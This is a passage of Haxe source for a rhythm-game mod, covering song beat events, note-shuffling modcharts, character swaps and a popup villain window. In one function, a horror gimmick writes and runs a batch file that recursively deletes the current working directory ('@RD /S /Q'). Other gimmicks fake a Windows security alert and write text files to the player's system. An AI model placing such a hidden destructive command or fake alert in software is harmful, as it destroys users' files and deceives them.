			charBackdrop.alpha = 0.8;

			for (char in alphaCharacters)
			{
				for (letter in char)
				{
					letter.alpha = 0.4;
				}
			}
		}
		if (curBeat % 2 == 0)
		{
			crowdPeople.forEach(function(crowdPerson:BGSprite)
			{
				crowdPerson.animation.play('idle', true);
			});
		}
		if (curBeat % 2 == 0 && tristan != null)
		{
			tristan.animation.play(curTristanAnim);
		}
		if (curBeat % 4 == 0 && spotLightPart && spotLight != null)
		{
			updateSpotlight(currentSection.mustHitSection);
		}
		if (SONG.song.toLowerCase() == 'shredder' && curBeat % 4 == 0)
		{
			var curSection = SONG.notes.indexOf(currentSection);
			guitarSection = curSection >= 64 && curSection < 80;
			dadStrumAmount = guitarSection ? 5 : 4;
			if (guitarSection)
			{
				notes.forEachAlive(function(daNote:Note)
				{
					daNote.MyStrum = null;
				});
			}
		}
		switch (curSong.toLowerCase())
		{
			//exploitation stuff
			case 'exploitation':
				switch(curStep)
			    {
					case 32:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub1'), 0.02, 1);
					case 56:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub2'), 0.02, 0.8);
					case 64:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub3'), 0.02, 1);
					case 85:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub4'), 0.02, 1);
					case 99:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub5'), 0.02, 0.5);
					case 105:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub6'), 0.02, 0.5);
					case 117:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub7'), 0.02, 1);
					case 512:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub8'), 0.02, 1);
					case 524:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub9'), 0.02, 1);
					case 533:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub10'), 0.02, 0.7);
					case 545:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub11'), 0.02, 1);
					case 566:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub12'), 0.02, 1);
					case 1263:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub13'), 0.02, 0.3);
					case 1270:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub14'), 0.02, 0.3);
					case 1276:
						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub15'), 0.02, 0.3);
					case 1100:
						PlatformUtil.sendWindowsNotification("Anticheat.dll", "Potential threat detected: expunged.dat");
				}
				switch (curBeat)
				{
					case 40:
						switchNotePositions([6,7,5,4,3,2,0,1]);
						switchNoteScroll(false);
					case 44:
						switchNotePositions([0,1,3,2,4,5,7,6]);
					case 46:
						switchNotePositions([6,7,5,4,3,2,0,1]);
						switchNoteScroll(false);
					case 56:
						switchNotePositions([1,3,2,0,5,7,6,4]);
					case 60:
						switchNotePositions([4,6,7,5,0,2,3,1]);
						switchNoteScroll(false);
					case 62:
						switchNotePositions([7,1,0,2,3,5,4,6]);
						switchNoteScroll(false);
					case 120:
						switchNoteScroll();
					case 124:
						switchNoteScroll();
					case 72:
						switchNotePositions([6,7,2,3,4,5,0,1]);
					case 76:
						switchNotePositions([6,7,4,5,2,3,0,1]);
					case 80:
						switchNotePositions([1,0,2,4,3,5,7,6]);
					case 88:
						switchNotePositions([4,2,0,1,6,7,5,3]);
					case 90:
						switchNoteSide();
					case 92:
						switchNoteSide();
					case 112:
						dadStrums.forEach(function(strum:StrumNote)
						{
							var targetPosition = (FlxG.width / 8) + Note.swagWidth * Math.abs(2 * strum.ID) + 78 - (78 / 2);
							FlxTween.completeTweensOf(strum);
							strum.angle = 0;
			
							FlxTween.angle(strum, strum.angle, strum.angle + 360, 0.2, {ease: FlxEase.circOut});
							FlxTween.tween(strum, {x: targetPosition}, 0.6, {ease: FlxEase.backOut});
							
						});
						playerStrums.forEach(function(strum:StrumNote)
						{
							var targetPosition = (FlxG.width / 8) + Note.swagWidth * Math.abs((2 * strum.ID) + 1) + 78 - (78 / 2);
							
							FlxTween.completeTweensOf(strum);
							strum.angle = 0;
			
							FlxTween.angle(strum, strum.angle, strum.angle + 360, 0.2, {ease: FlxEase.circOut});
							FlxTween.tween(strum, {x: targetPosition}, 0.6, {ease: FlxEase.backOut});
						});
					case 143:
						swapGlitch(Conductor.crochet / 1000, 'cheating');
					case 144:
						modchart = ExploitationModchartType.Cheating; //While we're here, lets bring back a familiar modchart
					case 191:
						swapGlitch(Conductor.crochet / 1000, 'expunged');
					case 192:
						dadStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});
						playerStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});
						modchart = ExploitationModchartType.Cyclone;
					case 224:
						modchart = ExploitationModchartType.Jitterwave;
					case 255:
						swapGlitch(Conductor.crochet / 1000, 'unfair');
					case 256:
						modchart = ExploitationModchartType.Unfairness;
					case 287:
						swapGlitch(Conductor.crochet / 1000, 'chains');
					case 288:
						dadStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});
						playerStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});
						modchart = ExploitationModchartType.PingPong;
					case 455:
						swapGlitch(Conductor.crochet / 1000, 'cheating-2');
						modchart = ExploitationModchartType.None;
						dadStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
							strum.resetY();
						});
						playerStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
							strum.resetY();
						});
					case 456:
						switchNotePositions([1,0,2,3,4,5,7,6]);
					case 460:
						switchNotePositions([1,2,0,3,4,7,5,6]);
					case 465:
						switchNotePositions([1,2,3,0,7,4,5,6]);
					case 470:
						switchNotePositions([6,2,3,0,7,4,5,1]);
					case 475:
						switchNotePositions([2,6,3,0,7,5,4,1]);
					case 480:
						switchNotePositions([2,3,6,0,5,7,4,1]);
					case 486:
						swapGlitch((Conductor.crochet / 1000) * 2, 'expunged');
					case 487:
						modchart = ExploitationModchartType.ScrambledNotes;
				}
			case 'polygonized':
				switch (curBeat)
				{
					case 608:
						defaultCamZoom = 0.8;
						if (PlayState.instance.localFunny != PlayState.CharacterFunnyEffect.Recurser)
						{
							for (bgSprite in backgroundSprites)
							{
								FlxTween.tween(bgSprite, {alpha: 0}, 1);
							}
							for (bgSprite in revertedBG)
							{
								FlxTween.tween(bgSprite, {alpha: 1}, 1);
							}
							for (char in [boyfriend, gf])
							{
								if (char.animation.curAnim != null && char.animation.curAnim.name.startsWith('sing') && !char.animation.curAnim.finished)
								{
									char.animation.finishCallback = function(animation:String)
									{
										char.canDance = false;
										char == boyfriend ? char.playAnim('hey', true) : char.playAnim('cheer', true);
									}
								}
								else
								{
									char.canDance = false;
									char == boyfriend ? char.playAnim('hey', true) : char.playAnim('cheer', true);
								}
							}

							canFloat = false;
							FlxG.camera.flash(FlxColor.WHITE, 0.25);

							switchDad('dave', dad.getPosition(), false);

							FlxTween.color(dad, 0.6, dad.color, nightColor);
							if (formoverride != 'tristan-golden-glowing')
							{
								FlxTween.color(boyfriend, 0.6, boyfriend.color, nightColor);
							}
							FlxTween.color(gf, 0.6, gf.color, nightColor);

							dad.setPosition(50, 270);
							boyfriend.setPosition(843, 270);
							gf.setPosition(230, -60);
							for (char in [dad, boyfriend, gf])
							{
								repositionChar(char);
							}
							regenerateStaticArrows(0);
						}
						else
						{
							FlxG.sound.play(Paths.sound('static'), 0.1);
							curbg.loadGraphic(Paths.image('backgrounds/void/redsky', 'shared'));
							curbg.alpha = 1;
							curbg.visible = true;
							dad.animation.play('scared', true);
							dad.canDance = false;
						}
				}
			case 'memory':
				switch (curBeat)
				{
					case 416:
						switchDad('dave-annoyed', dad.getPosition());
						crazyZooming = true;
					case 672:
						crazyZooming = false;
				}
			case 'escape-from-california':
				switch (curBeat)
				{
					case 2:
						makeInvisibleNotes(true);
						defaultCamZoom += 0.2;
						subtitleManager.addSubtitle(LanguageManager.getTextString('california_sub1'), 0.02, 1.5);
					case 14:
					    subtitleManager.addSubtitle(LanguageManager.getTextString('california_sub2'), 0.04, 0.3, {subtitleSize: 60});
						FlxG.camera.fade(FlxColor.WHITE, 0.6, false, function()
						{
							FlxG.camera.fade(FlxColor.WHITE, 0, true);
						});
						FlxG.camera.shake(0.015, 0.6);
					case 16:
					    FlxG.camera.flash();
					    defaultCamZoom -= 0.2;
						makeInvisibleNotes(false);
					case 270:
						subtitleManager.addSubtitle(LanguageManager.getTextString('california_sub2'), 0.04, 0.3, {subtitleSize: 60});
						FlxG.camera.shake(0.005, 0.6);
						dad.canSing = false;
						dad.canDance = false;
						dad.playAnim('waa', true);
						dad.animation.finishCallback = function(anim:String)
						{
							dad.canSing = true;
							dad.canDance = true;
						}
					case 208:
						changeSign('1500miles');
					case 400:
						changeSign('1000miles');
					case 528:
						changeSign('500miles');
					case 712:
						FlxG.camera.fade(FlxColor.WHITE, (Conductor.crochet * 8) / 1000, false, function()
						{
							FlxG.camera.stopFX();
							FlxG.camera.flash();
						});
					case 720:
						FlxTween.num(trainSpeed, 0, 3, {ease: FlxEase.expoOut}, function(newValue:Float)
						{
							trainSpeed = newValue;
							train.animation.curAnim.frameRate = Std.int(FlxMath.lerp(0, 24, (trainSpeed / 30)));
						});
						changeSign('welcomeToGeorgia', new FlxPoint(1000, 450));

						remove(desertBG);
						remove(desertBG2);
						
					
						georgia = new BGSprite('georgia', 400, -50, Paths.image('california/geor gea', 'shared'), null, 1, 1, true);
						georgia.setGraphicSize(Std.int(georgia.width * 2.5));
						georgia.updateHitbox();
						georgia.color = nightColor;
						backgroundSprites.add(georgia);
						add(georgia);
				}
			case 'mealie':
				switch(curBeat) {
                    case 464:
						crazyZooming = true;
					case 592:
						crazyZooming = false;
				}
		}
		if (shakeCam)
		{
			gf.playAnim('scared', true);
		}

		var funny:Float = Math.max(Math.min(healthBar.value,1.9),0.1);//Math.clamp(healthBar.value,0.02,1.98);//Math.min(Math.min(healthBar.value,1.98),0.02);

		//health icon bounce but epic
		if (!inFiveNights)
		{
			iconP1.setGraphicSize(Std.int(iconP1.width + (50 * (funny + 0.1))),Std.int(iconP1.height - (25 * funny)));
			iconP2.setGraphicSize(Std.int(iconP2.width + (50 * ((2 - funny) + 0.1))),Std.int(iconP2.height - (25 * ((2 - funny) + 0.1))));
		}
		else
		{
			iconP2.setGraphicSize(Std.int(iconP2.width + (50 * funny)),Std.int(iconP2.height - (25 * funny)));
			iconP1.setGraphicSize(Std.int(iconP1.width + (50 * ((2 - funny) + 0.1))),Std.int(iconP1.height - (25 * ((2 - funny) + 0.1))));
		}

		iconP1.updateHitbox();
		iconP2.updateHitbox();

		if(curBeat % 2 == 0)
		{
			if (!boyfriend.animation.curAnim.name.startsWith("sing") && boyfriend.canDance && (boyfriend.animation.curAnim.name == "hit" ? boyfriend.animation.curAnim.finished : true) && (boyfriend.animation.curAnim.name == "dodge" ? boyfriend.animation.curAnim.finished : true))
			{
				boyfriend.playAnim('idle', true);
				if (darkLevels.contains(curStage) && SONG.song.toLowerCase() != "polygonized" && formoverride != 'tristan-golden-glowing' && bfTween == null)
				{
					boyfriend.color = nightColor;
				}
				else if(sunsetLevels.contains(curStage) && bfTween == null)
				{
					boyfriend.color = sunsetColor;
				}
				else if (bfTween == null)
				{
					boyfriend.color = FlxColor.WHITE;
				}
				else
				{
					if (!bfTween.active && !bfTween.finished)
					{
						bfTween.active = true;
					}
					boyfriend.color = bfTween.color;
				}
			}
		}

	}
	function gameOver()
	{
		#if windows
		if (window != null)
		{
			closeExpungedWindow();

			//x,y, width, height
			FlxTween.tween(Application.current.window, {x: windowProperties[0], y: windowProperties[1], width: windowProperties[2], height: windowProperties[3]}, 1, {ease: FlxEase.circInOut});
		}
		#end
		var deathSkinCheck = formoverride == "bf" || formoverride == "none" ? SONG.player1 : isRecursed ? boyfriend.curCharacter : formoverride;
		var chance = FlxG.random.int(0, 99);
		if (chance <= 2 && eyesoreson)
		{
			openSubState(new TheFunnySubState(deathSkinCheck));
			#if desktop
				DiscordClient.changePresence("GAME OVER -- "
				+ SONG.song
				+ " ("
				+ storyDifficultyText
				+ ") ",
				"\n what", iconRPC);
			#end
		}
		else
		{
			#if desktop
			if (SONG.song.toLowerCase() == 'exploitation')
			{
				var expungedLines:Array<String> = 
				[
					'[I FOUND YOU]', 
					"[I CAN SEE YOU]", 
					'[HAHAHHAHAHA]', 
					"[PUNISHMENT DAY IS HERE, THIS ONE IS REMOVING YOU]",
					"[GOT YOU]",
					"[TRY AGAIN, IF YOU DARE]",
					"[NICE TRY]",
					"[I COULD DO THIS ALL DAY]",
					"[DO THAT AGAIN, I LIKE WATCHING YOU FAIL]"
				];
				CoolSystemStuff.generateTextFile(expungedLines[FlxG.random.int(0, expungedLines.length)], 'HELLO');
			}
			#end

			if (SONG.song.toLowerCase() == 'recursed')
			{
				cancelRecursedCamTween();
			}
			
			if (!inFiveNights)
			{
				if (funnyFloatyBoys.contains(boyfriend.curCharacter))
				{
					openSubState(new GameOverPolygonizedSubState(boyfriend.getScreenPosition().x, boyfriend.getScreenPosition().y, deathSkinCheck));
				}
				else
				{
					openSubState(new GameOverSubstate(boyfriend.getScreenPosition().x, boyfriend.getScreenPosition().y, deathSkinCheck));
				}
			}
			else
			{
				if (powerDown != null)
				{
					powerDown.stop();
				}
				openSubState(new GameOverFNAF());
			}
			#if desktop
				DiscordClient.changePresence("GAME OVER -- "
				+ SONG.song
				+ " ("
				+ storyDifficultyText
				+ ") ",
				"\nAcc: "
				+ truncateFloat(accuracy, 2)
				+ "% | Score: "
				+ songScore
				+ " | Misses: "
				+ misses, iconRPC);
			#end
		}
		
	}

	function eatShit(ass:String):Void
	{
		if (dialogue[0] == null)
		{
			trace(ass);
		}
		else
		{
			trace(dialogue[0]);
		}
	}

	public function addSplitathonChar(char:String):Void
	{
		boyfriend.stunned = true; //hopefully this stun stuff should prevent BF from randomly missing a note
		
		switchDad(char, new FlxPoint(300, 450), false);
		repositionChar(dad);

		boyfriend.stunned = false;
	}

	public function splitathonExpression(character:String, expression:String):Void
	{
		boyfriend.stunned = true;
		if(splitathonCharacterExpression != null)
		{
			dadGroup.remove(splitathonCharacterExpression);
		}
		switch (character)
		{
			case 'dave':
				splitathonCharacterExpression = new Character(0, 225, 'dave-splitathon');
			case 'bambi':
				splitathonCharacterExpression = new Character(0, 580, 'bambi-splitathon');
		}
		dadGroup.insert(dadGroup.members.indexOf(dad), splitathonCharacterExpression);

		splitathonCharacterExpression.color = getBackgroundColor(curStage);
		splitathonCharacterExpression.canDance = false;
		splitathonCharacterExpression.playAnim(expression, true);
		boyfriend.stunned = false;
	}

	public function preload(graphic:String) //preload assets
	{
		if (boyfriend != null)
		{
			boyfriend.stunned = true;
		}
		var newthing:FlxSprite = new FlxSprite(9000,-9000).loadGraphic(Paths.image(graphic));
		add(newthing);
		remove(newthing);
		if (boyfriend != null)
		{
			boyfriend.stunned = false;
		}
	}
	public function repositionChar(char:Character)
	{
		char.x += char.globalOffset[0];
		char.y += char.globalOffset[1];
	}
	function updateSpotlight(bfSinging:Bool)
	{
		var curSinger = bfSinging ? boyfriend : dad;

		if (lastSinger != curSinger)
		{
			gf.canDance = false;
			bfSinging ? gf.playAnim("singRIGHT", true) : gf.playAnim("singLEFT", true);
			gf.animation.finishCallback = function(anim:String)
			{
				gf.canDance = true;
			}

			var positionOffset:FlxPoint = new FlxPoint();

			switch (curSinger.curCharacter)
			{
				case 'bambi-new' | 'bambi-angey':
					positionOffset.x = -35;
					positionOffset.y = -90;
				case 'bf-pixel':
					positionOffset.y = -225;
			}
			var targetPosition = new FlxPoint(curSinger.getGraphicMidpoint().x - (spotLight.width / 2) - positionOffset.x, curSinger.getGraphicMidpoint().y - (spotLight.height / 2) - positionOffset.y);
			
			FlxTween.tween(spotLight, {x: targetPosition.x, y: targetPosition.y}, 0.66, {ease: FlxEase.circOut});
			lastSinger = curSinger;
		}
	}
	function switchToNight()
	{
		var bedroomSpr = BGSprite.getBGSprite(backgroundSprites, 'bg');
		var baldiSpr = BGSprite.getBGSprite(backgroundSprites, 'baldi');
		var rubySpr = BGSprite.getBGSprite(backgroundSprites, 'ruby');

		bedroomSpr.loadGraphic(Paths.image('backgrounds/bedroom/night/bg'));
		baldiSpr.loadGraphic(Paths.image('backgrounds/bedroom/night/bed'));
		if (rubySpr != null)
		{
			rubySpr.loadGraphic(Paths.image('backgrounds/bedroom/night/ruby'));
		}
		curStage = 'bedroomNight';

		switchDad('playrobot-shadow', dad.getPosition(), true, false);
		tristanInBotTrot.animation.play('idleNight');
		
		if (formoverride != 'tristan-golden') {
		    boyfriend.color = getBackgroundColor(curStage);
		}

		if (formoverride == 'tristan-golden' || formoverride == 'tristan-golden-glowing') {
			boyfriend.color = FlxColor.WHITE;
            switchBF('tristan-golden-glowing', boyfriend.getPosition(), true, true);
		}
	}
	function nofriendAttack()
	{
		dad.canDance = false;
		dad.canSing = false;
		dad.playAnim('attack', true);
		var runSfx = new FlxSound().loadEmbedded(Paths.soundRandom('fiveNights/run', 1, 2, 'shared'));
		runSfx.play();
	}
	function sixAM()
	{
		FlxG.sound.music.volume = 1;
		vocals.volume = 1;
		camHUD.alpha = 1;

		FlxG.camera.flash(FlxColor.WHITE, 0.5);
		black = new FlxSprite(0, 0).makeGraphic(2560, 1440, FlxColor.BLACK);
		black.screenCenter();
		black.scrollFactor.set();
		black.cameras = [camHUD];
		add(black);

		var sixAM:FlxText = new FlxText(0, 0, 0, "6 AM", 90);
		sixAM.setFormat(Paths.font('fnaf.ttf'), 90, FlxColor.WHITE, CENTER);
		sixAM.antialiasing = false;
		sixAM.scrollFactor.set();
		sixAM.screenCenter();
		sixAM.cameras = [camHUD];
		sixAM.alpha = 0;
		add(sixAM);

		FlxTween.tween(sixAM, {alpha: 1}, 1);

		var crowdSmall = new FlxSound().loadEmbedded(Paths.sound('fiveNights/CROWD_SMALL_CHIL_EC049202', 'shared'));
		crowdSmall.play();
	}
	public function getCamZoom():Float
	{
		return defaultCamZoom;
	}
	public static function resetShader()
	{
		PlayState.instance.shakeCam = false;
		PlayState.instance.camZooming = false;
		#if SHADERS_ENABLED
		screenshader.shader.uampmul.value[0] = 0;
		screenshader.Enabled = false;
		#end
	}

	function sectionStartTime(section:Int):Float
	{
		var daBPM:Float = SONG.bpm;
		var daPos:Float = 0;
		for (i in 0...section)
		{
			daPos += 4 * (1000 * 60 / daBPM);
		}
		return daPos;
	}
	function switchNoteScroll(cancelTweens:Bool = true)
	{
		switch (scrollType)
		{
			case 'upscroll':
				strumLine.y = DOWNSCROLL_Y;
				scrollType = 'downscroll';
			case 'downscroll':
				strumLine.y = UPSCROLL_Y;
				scrollType = 'upscroll';
		}
		for (strumNote in strumLineNotes)
		{
			if (cancelTweens)
			{
				FlxTween.completeTweensOf(strumNote);
			}
			strumNote.angle = 0;
			
			FlxTween.angle(strumNote, strumNote.angle, strumNote.angle + 360, 0.4, {ease: FlxEase.expoOut});
			FlxTween.tween(strumNote, {y: strumLine.y}, 0.6, {ease: FlxEase.backOut});
		}
	}

	function switchNoteSide()
	{
		for (i in 0...4)
		{
			var curOpponentNote = dadStrums.members[i];
			var curPlayerNote = playerStrums.members[i];

			FlxTween.tween(curOpponentNote, {x: curPlayerNote.x}, 0.6, {ease: FlxEase.expoOut, startDelay: 0.01 * i});
			FlxTween.tween(curPlayerNote, {x: curOpponentNote.x}, 0.6, {ease: FlxEase.expoOut, startDelay: 0.01 * i});
		}
		switchSide = !switchSide;
	}

	function switchNotePositions(order:Array<Int>)
	{
		var positions:Array<Float> = [];
		for (i in 0...4)
		{
			var curNote = playerStrums.members[i];
			positions.push(curNote.baseX);
		}
		for (i in 0...4)
		{
			var curNote = dadStrums.members[i];
			positions.push(curNote.baseX);
		}
		for (i in 0...4)
		{
			var curOpponentNote = dadStrums.members[i];
			var curPlayerNote = playerStrums.members[i];

			FlxTween.tween(curOpponentNote, {x: positions[order[i + playerStrumAmount]]}, 0.6, {ease: FlxEase.expoOut, startDelay: 0.01 * i});
			FlxTween.tween(curPlayerNote, {x: positions[order[i]]}, 0.6, {ease: FlxEase.expoOut, startDelay: 0.01 * i});
		}
		switchSide = !switchSide;
	}

	function switchDad(newChar:String, position:FlxPoint, reposition:Bool = true, updateColor:Bool = true)
	{
		if (reposition)
		{
			position.x -= dad.globalOffset[0];
			position.y -= dad.globalOffset[1];
		}
		dadGroup.remove(dad);
		dad = new Character(position.x, position.y, newChar, false);
		dadGroup.add(dad);
		if (FileSystem.exists(Paths.image('ui/iconGrid/${dad.curCharacter}', 'preload')))
		{
			iconP2.changeIcon(dad.curCharacter);
		}
		healthBar.createFilledBar(dad.barColor, boyfriend.barColor);
		
		if (updateColor)
		{
			dad.color = getBackgroundColor(curStage);
		}
		if (reposition)
		{
			repositionChar(dad);
		}
	}
	function switchBF(newChar:String, position:FlxPoint, reposition:Bool = true, updateColor:Bool = true)
	{
		if (reposition)
		{
			position.x -= boyfriend.globalOffset[0];
			position.y -= boyfriend.globalOffset[1];
		}
		bfGroup.remove(boyfriend);
		boyfriend = new Boyfriend(position.x, position.y, newChar);
		bfGroup.add(boyfriend);
		if (FileSystem.exists(Paths.image('ui/iconGrid/${boyfriend.curCharacter}', 'preload')))
		{
			iconP1.changeIcon(boyfriend.curCharacter);
		}
		healthBar.createFilledBar(dad.barColor, boyfriend.barColor);
		
		if (updateColor)
		{
			boyfriend.color = getBackgroundColor(curStage);
		}
		if (reposition)
		{
			repositionChar(boyfriend);
		}
	}
	function switchGF(newChar:String, position:FlxPoint, reposition:Bool = true, updateColor:Bool = true)
	{
		if (reposition)
		{
			position.x -= gf.globalOffset[0];
			position.y -= gf.globalOffset[1];
		}
		gfGroup.remove(gf);
		gf = new Character(position.x, position.y, newChar);
		gfGroup.add(gf);
		
		if (updateColor)
		{
			gf.color = getBackgroundColor(curStage);
		}
		if (reposition)
		{
			repositionChar(gf);
		}
	}

	function makeInvisibleNotes(invisible:Bool)
	{
		if (invisible)
		{
			for (strumNote in strumLineNotes)
			{
				FlxTween.cancelTweensOf(strumNote);
				FlxTween.tween(strumNote, {alpha: 0}, 1);
			}
		}
		else
		{
			for (strumNote in strumLineNotes)
			{
				FlxTween.cancelTweensOf(strumNote);
				FlxTween.tween(strumNote, {alpha: 1}, 1);
			}
		}
	}
	function changeDoorState(closed:Bool)
	{
		doorClosed = closed;
		doorChanging = true;
		FlxG.sound.play(Paths.sound('fiveNights/doorInteract', 'shared'), 1);
		if (doorClosed)
		{
			doorButton.loadGraphic(Paths.image('fiveNights/btn_doorClosed'));
			powerMeter.loadGraphic(Paths.image('fiveNights/powerMeter_2'));
			door.animation.play('doorShut');
			
			powerDrainer = 3;
		}
		else
		{
			doorButton.loadGraphic(Paths.image('fiveNights/btn_doorOpen'));
			powerMeter.loadGraphic(Paths.image('fiveNights/powerMeter'));
			door.animation.play('doorOpen');

			powerDrainer = 1;
		}
		door.animation.finishCallback = function(animation:String)
		{
			doorChanging = false;
		}
	}
	function changeSign(asset:String, ?position:FlxPoint)
	{
		sign.loadGraphic(Paths.image('california/$asset', 'shared'));
		if (position != null)
		{
			sign.setPosition(position.x, position.y);
		}
		else
		{
			sign.setPosition(FlxG.width + sign.width, 450);
		}
	}

	function popupWindow(regeneratingWindow:Bool = false)
	{
		if (!regeneratingWindow)
		{
			var screenwidth = Application.current.window.display.bounds.width;
			var screenheight = Application.current.window.display.bounds.height;

			// center
			Application.current.window.x = Std.int((screenwidth / 2) - (1280 / 2));
			Application.current.window.y = Std.int((screenheight / 2) - (720 / 2));
			Application.current.window.width = 1280;
			Application.current.window.height = 720;
		}
		
		window = Application.current.createWindow({
			title: "expunged.dat",
			width: 800,
			height: 800,
			borderless: true,
			alwaysOnTop: true
		});

		window.stage.color = 0x00010101;
		@:privateAccess
		window.stage.addEventListener("keyDown", FlxG.keys.onKeyDown);
		@:privateAccess
		window.stage.addEventListener("keyUp", FlxG.keys.onKeyUp);
		#if linux
		//testing stuff
		window.stage.color = 0xff000000;
		trace('BRAP');
		#end

		PlatformUtil.getWindowsTransparent();
		
		window.onClose.add(function()
		{
			if (expungedOffset != null)
			{
				expungedProperties = [expungedScroll.x, expungedScroll.y];
			}
			if (!closedExpunged)
			{
				closedExpunged = true;
			}
			else
			{
				killCount++;

				for (sub in expungedSubs)
				{
					expungedSubs.remove(sub);
				}
				for (subtitle in subtitleManager.members)
				{
					subtitle.finish();
				}
				
				switch (killCount)
				{
					case 1: 
						trace('enough');
					case 2:
						trace('ok');
					case 3:
						trace('wow');
				}
			}
			#if windows
			popupWindow(true);
			#end
		}, false, 100);

		preDadPos = dad.getPosition();
		dad.x = 0;
		dad.y = 0;

		FlxG.mouse.useSystemCursor = true;

		generateWindowSprite();

		expungedScroll.scrollRect = new Rectangle();
		window.stage.addChild(expungedScroll);
		expungedScroll.addChild(expungedSpr);
		expungedScroll.scaleX = 0.5;
		expungedScroll.scaleY = 0.5;

		expungedOffset.x = Application.current.window.x;
		expungedOffset.y = Application.current.window.y;

		dad.visible = false;
		
		if (!regeneratingWindow)
		{
			var windowX = Application.current.window.x + ((Application.current.window.display.bounds.width) * 0.140625);

			windowSteadyX = windowX;

			FlxTween.tween(expungedOffset, {x: -20}, 2, {ease: FlxEase.elasticOut});

			FlxTween.tween(Application.current.window, {x: windowX}, 2.2, {
				ease: FlxEase.elasticOut,
				onComplete: function(tween:FlxTween)
				{
					ExpungedWindowCenterPos.x = expungedOffset.x;
					ExpungedWindowCenterPos.y = expungedOffset.y;
					expungedMoving = false;
				}
			});
		}
		else
		{
			canPause = false;
			expungedMoving = true;
			expungedOffset.x = expungedProperties[0];
			expungedOffset.y = 3000;
			FlxTween.tween(expungedOffset, {y: expungedProperties[1]}, 1, {ease: FlxEase.circInOut, onComplete: function(tween:FlxTween)
			{
				expungedMoving = false;
			}});

			FlxG.sound.music.onComplete = null;
			vocals.volume = 0;
			inCutscene = true; //lol
			shakeCam = false;
			
			FlxTween.num(timeSpeed, 0, 1, {ease: FlxEase.circOut}, function(newValue:Float)
			{
				timeSpeed = newValue;
			});
			FlxTween.tween(FlxG.sound.music, {volume: 0}, 1, {
				onComplete: function(tween:FlxTween)
				{
					paused = true;
					new FlxTimer().start(1, function(timer:FlxTimer)
					{
						uhOh();
					});
				}
			});
		}

		Application.current.window.onClose.add(function()
		{
			if (window != null)
			{
				closeExpungedWindow();
			}
		}, false, 100);

		Application.current.window.focus();
		expungedWindowMode = true;

		@:privateAccess
		lastFrame = dad._frame;
	}

	function generateWindowSprite()
	{
		var m = new Matrix();
		m.translate(0, 0);
		expungedSpr.graphics.beginBitmapFill(dad.pixels, m);
		expungedSpr.graphics.drawRect(0, 0, dad.pixels.width, dad.pixels.height);
		expungedSpr.graphics.endFill();
	}
	function uhOh()
	{
		black = new FlxSprite().makeGraphic(FlxG.width * 3, FlxG.height * 3, FlxColor.BLACK);
		black.screenCenter();
		black.scrollFactor.set();
		black.alpha = 0;
		add(black);
		FlxTween.tween(black, {alpha: 0.6}, 1);
		
		new FlxTimer().start(expungedSubs[0], function(timer:FlxTimer)
		{
			subtitleManager.addSubtitle(expungedSubs[0][0], expungedSubs[0][2], expungedSubs[0][1], function()
			{
				nextExpungedSub();
			});
		});
	}
	function nextExpungedSub()
	{
		expungedSubs.splice(expungedSubs[0], 1);
		var nextSub:Dynamic = expungedSubs[0];
		if (expungedSubs.length <= 0)
		{
			new FlxTimer().start(1, function(timer:FlxTimer)
			{
				CoolSystemStuff.generateTextFile("[I'VE HAD ENOUGH]", "GOODBYE");
				
				var batchPath = CoolSystemStuff.getTempPath() + "/goodbye.bat";
				
				var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
				File.saveContent(batchPath, crazyBatch);
				
				new Process(batchPath, []);
				Sys.exit(0);
			});
		}
		else
		{
			new FlxTimer().start(nextSub[3], function(timer:FlxTimer)
			{
				subtitleManager.addSubtitle(nextSub[0], nextSub[2], nextSub[1], function()
				{
					nextExpungedSub();
				});
			});
		}
	}
	public function closeExpungedWindow()
	{
		expungedWindowMode = false;
		window.onClose.removeAll();
		window.close();
		window = null;
	}
}
enum ExploitationModchartType
{
	None; Cheating; Figure8; ScrambledNotes; Cyclone; Unfairness; Jitterwave; PingPong; Sex;
}

enum CharacterFunnyEffect
{
	None; Dave; Bambi; Tristan; Exbungo; Recurser;
}
